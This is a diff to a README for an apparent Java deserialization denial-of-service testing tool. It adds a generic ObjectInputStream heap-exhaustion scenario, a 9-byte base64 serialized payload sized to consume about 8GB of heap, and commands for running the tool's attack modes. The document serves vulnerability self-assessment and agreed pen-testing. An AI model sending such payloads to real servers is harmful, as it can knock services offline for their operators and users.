@@ -6,13 +6,18 @@ Provided as-is, only for self-assessment, agreed pen-testing purposes, etc.
 
 ## Basic Scenarios
 
-* Heap Dos using nested Object[], ArrayList and HashMap
+* Generic Heap DoS inside ObjectInputStream
+* Heap DoS using nested Object[], ArrayList and HashMap
 * Collision attack on Hashtable
 * Collision attack on HashMap (Oracle Java 1.7)
 
 ## Payloads for 8GB heap consumption
 
 Should be enough to test the vulnerability in most app servers.
+
+Generic (9 bytes):
+
+    rO0ABX1////3
 
 Nested Object[] (44 bytes):
 
@@ -39,7 +44,9 @@ Nested HashMap (110 bytes):
 
 E.g:
 
-    java -Xmx25g -jar target/oisdos-1.0.jar ObjectArrayHeap
+    java -Xmx25g -jar target/oisdos-1.0.jar Generic
+
+    java -Xmx25g -jar target/oisdos-1.0.jar ArrayListHeap
 
     java -Xmx25g -jar target/oisdos-1.0.jar HashtableCollisions 5000
 
